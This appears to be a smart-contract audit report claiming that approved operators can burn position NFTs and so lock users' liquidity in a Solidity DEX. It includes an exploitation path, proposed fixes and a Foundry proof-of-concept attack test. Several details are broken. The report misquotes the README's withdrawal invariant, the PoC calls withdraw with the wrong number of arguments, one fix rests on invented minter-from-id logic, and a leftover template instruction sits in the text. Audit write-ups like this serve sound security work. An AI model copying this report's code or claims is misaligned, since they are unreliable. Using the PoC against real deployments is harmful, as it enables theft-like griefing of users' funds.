## Title
NFT Burning by Approved Operators Causes Permanent Liquidity Lock for Positions Minted with Random Salt

## Summary
The `BasePositions.withdraw()` function requires NFT ownership authorization, but approved operators can burn the NFT via `burn()`, permanently locking user liquidity when the position was minted using the random salt generation in `mint()`. Since the salt is derived from non-recoverable values (`prevrandao()` and `gas()`), users cannot re-mint the same NFT ID to regain access to their positions.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/base/BasePositions.sol` (withdraw function, line 128) and `src/base/BaseNonfungibleToken.sol` (mint and burn functions, lines 109-117 and 133-135)

**Intended Logic:** The NFT-based position system is designed to allow position owners and their approved operators to manage liquidity. Users should be able to withdraw their positions at any time, as stated in the protocol's critical invariants. [1](#0-0) 

**Actual Logic:** When a position is created using `mintAndDeposit()`, it internally calls `mint()` without a salt parameter. [2](#0-1)  The parameterless `mint()` function generates a salt using `keccak256(prevrandao(), gas())` [3](#0-2) , which is non-deterministic and not stored anywhere. If an approved operator burns this NFT [4](#0-3) , the user loses authorization to withdraw since `withdraw()` requires `authorizedForNft(id)`. [5](#0-4) 

**Exploitation Path:**
1. Alice calls `mintAndDeposit()` to create a liquidity position worth 100 ETH. The NFT ID is generated using a random salt from `prevrandao()` and `gas()`.
2. Alice approves a DEX aggregator contract as an operator for her NFT (legitimate use case for automated position management).
3. The malicious aggregator calls `burn(id)` on Alice's NFT. This succeeds because it's an approved operator.
4. Alice attempts to call `withdraw(id, poolKey, tickLower, tickUpper, liquidity)` to remove her liquidity.
5. The transaction reverts with `NotUnauthorizedForToken` because the authorization check fails - the NFT no longer exists. [6](#0-5) 
6. Alice cannot re-mint the NFT with the same ID because she doesn't know the original salt (it was randomly generated and never emitted).
7. Alice's 100 ETH liquidity is permanently locked in the Core contract.

**Security Property Broken:** This violates the critical invariant: "All positions MUST be withdrawable at any time." [1](#0-0)  The position exists in the Core contract and holds user funds, but the authorization mechanism prevents withdrawal after NFT burning.

## Impact Explanation
- **Affected Assets**: All liquidity positions minted via `mintAndDeposit()` (the default method) where users have granted operator approvals.
- **Damage Severity**: Complete loss of deposited liquidity for affected users. The funds remain in the Core contract but become inaccessible without the NFT authorization. While technically recoverable through forensic blockchain analysis to recover the salt, this is practically infeasible for most users.
- **User Impact**: Any user who uses `mintAndDeposit()` and grants operator approvals (common for DEX aggregators, automated portfolio managers, or lending protocols that use LP NFTs as collateral) is vulnerable to this griefing attack.

## Likelihood Explanation
- **Attacker Profile**: Any approved operator for the NFT - could be a malicious DEX aggregator, compromised automation service, or malicious smart contract wallet.
- **Preconditions**: 
  1. User creates position using `mintAndDeposit()` (not `mintAndDepositWithSalt()`)
  2. User approves an operator (legitimate use case)
  3. Operator is malicious or compromised
- **Execution Complexity**: Single transaction - the attacker simply calls `burn(id)` as an approved operator.
- **Frequency**: Can be executed once per position by any approved operator at any time.

## Recommendation
Provide a specific code fix with precise changes:

**Option 1: Emit the salt in an event during minting**
```solidity
// In src/base/BaseNonfungibleToken.sol, add new event:
event TokenMinted(address indexed minter, uint256 indexed id, bytes32 salt);

// In mint() function at line 109-117, modify to:
function mint() public payable returns (uint256 id) {
    bytes32 salt;
    assembly ("memory-safe") {
        mstore(0, prevrandao())
        mstore(32, gas())
        salt := keccak256(0, 64)
    }
    id = mint(salt);
    emit TokenMinted(msg.sender, id, salt); // Add this line
}
```

**Option 2: Remove withdraw authorization requirement for the original minter**
```solidity
// In src/base/BasePositions.sol, modify withdraw to check both NFT ownership AND original minter:
function withdraw(
    uint256 id,
    PoolKey memory poolKey,
    int32 tickLower,
    int32 tickUpper,
    uint128 liquidity,
    address recipient,
    bool withFees
) public payable returns (uint128 amount0, uint128 amount1) {
    // Allow withdrawal if caller owns NFT OR is the original minter
    address nftOwner = _ownerOf(id);
    address originalMinter = address(uint160(id)); // Derive from first 160 bits if stored in ID
    
    if (nftOwner == address(0)) {
        // NFT is burned, check if caller is original minter
        require(msg.sender == originalMinter, "Not authorized");
    } else {
        // NFT exists, use standard authorization
        require(_isApprovedOrOwner(msg.sender, id), "Not authorized");
    }
    
    (amount0, amount1) = abi.decode(
        lock(abi.encode(CALL_TYPE_WITHDRAW, id, poolKey, tickLower, tickUpper, liquidity, recipient, withFees)),
        (uint128, uint128)
    );
}
```

**Option 3 (Recommended): Document and encourage use of `mintAndDepositWithSalt()`**
Add clear documentation warning users about the risks of using `mintAndDeposit()` with operator approvals, and recommend using `mintAndDepositWithSalt()` with a known salt for any position where operator approvals might be granted.

## Proof of Concept
```solidity
// File: test/Exploit_NFTBurningGriefing.t.sol
// Run with: forge test --match-test test_NFTBurningLocksLiquidity -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";

contract Exploit_NFTBurningGriefing is FullTest {
    address alice = makeAddr("alice");
    address maliciousOperator = makeAddr("maliciousOperator");
    
    function test_NFTBurningLocksLiquidity() public {
        // SETUP: Alice creates a position with significant liquidity
        PoolKey memory poolKey = createPool(0, 1 << 63, 100);
        
        vm.startPrank(alice);
        token0.mint(alice, 1000 ether);
        token1.mint(alice, 1000 ether);
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        
        // Alice uses mintAndDeposit which generates random salt
        (uint256 id, uint128 liquidity,,) = positions.mintAndDeposit(
            poolKey, -100, 100, 100 ether, 100 ether, 0
        );
        
        assertGt(liquidity, 0, "Position created with liquidity");
        
        // Alice approves an operator (legitimate use case: DEX aggregator)
        positions.approve(maliciousOperator, id);
        vm.stopPrank();
        
        // EXPLOIT: Malicious operator burns Alice's NFT
        vm.prank(maliciousOperator);
        positions.burn(id);
        
        // VERIFY: Alice cannot withdraw her liquidity anymore
        vm.startPrank(alice);
        vm.expectRevert(); // Reverts with NotUnauthorizedForToken
        positions.withdraw(id, poolKey, -100, 100, liquidity);
        
        // Alice tries to re-mint with random salt - gets a DIFFERENT ID
        uint256 newId = positions.mint();
        assertTrue(newId != id, "Re-minting produces different ID");
        
        // Alice's liquidity is permanently locked
        (uint128 lockedLiquidity,,,,) = positions.getPositionFeesAndLiquidity(
            id, poolKey, -100, 100
        );
        assertEq(lockedLiquidity, liquidity, "Liquidity remains locked in Core");
        vm.stopPrank();
    }
}
```

## Notes

This vulnerability violates the critical invariant that "All positions MUST be withdrawable at any time" as documented in the README. [7](#0-6) 

The issue stems from the design decision to use NFTs as authorization tokens combined with the random salt generation in the default `mint()` function. While `mintAndDepositWithSalt()` exists as an alternative, users are not warned about this security implication, and `mintAndDeposit()` is the more convenient default method. [8](#0-7) 

The salt recovery path is theoretically possible but practically infeasible: a user would need to identify their original mint transaction, retrieve the block's `prevrandao` value, and accurately simulate the exact gas consumption at the point of salt generation - an extremely complex forensic analysis requiring deep blockchain expertise and archive node access.

Legitimate use cases for operator approvals include DEX aggregators, automated liquidity managers, lending protocols using LP NFTs as collateral, and smart contract wallets with multiple signers. This makes the attack surface significant despite requiring user approval of an operator.

### Citations

**File:** README.md (L200-204)
```markdown
The sum of all swap deltas, position update deltas, and position fee collection should never at any time result in a pool with a balance less than zero of either token0 or token1.

All positions should be able to be withdrawn at any time (except for positions using third-party extensions; the extensions in the repository should never block withdrawal within the block gas limit).

The codebase contains extensive unit and fuzzing test suites; many of these include invariants that should be upheld by the system.
```

**File:** src/base/BasePositions.sol (L120-133)
```text
    function withdraw(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 liquidity,
        address recipient,
        bool withFees
    ) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_WITHDRAW, id, poolKey, tickLower, tickUpper, liquidity, recipient, withFees)),
            (uint128, uint128)
        );
    }
```

**File:** src/base/BasePositions.sol (L159-183)
```text
    function mintAndDeposit(
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 maxAmount0,
        uint128 maxAmount1,
        uint128 minLiquidity
    ) external payable returns (uint256 id, uint128 liquidity, uint128 amount0, uint128 amount1) {
        id = mint();
        (liquidity, amount0, amount1) = deposit(id, poolKey, tickLower, tickUpper, maxAmount0, maxAmount1, minLiquidity);
    }

    /// @inheritdoc IPositions
    function mintAndDepositWithSalt(
        bytes32 salt,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 maxAmount0,
        uint128 maxAmount1,
        uint128 minLiquidity
    ) external payable returns (uint256 id, uint128 liquidity, uint128 amount0, uint128 amount1) {
        id = mint(salt);
        (liquidity, amount0, amount1) = deposit(id, poolKey, tickLower, tickUpper, maxAmount0, maxAmount1, minLiquidity);
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L109-117)
```text
    function mint() public payable returns (uint256 id) {
        bytes32 salt;
        assembly ("memory-safe") {
            mstore(0, prevrandao())
            mstore(32, gas())
            salt := keccak256(0, 64)
        }
        id = mint(salt);
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L133-135)
```text
    function burn(uint256 id) external payable authorizedForNft(id) {
        _burn(id);
    }
```
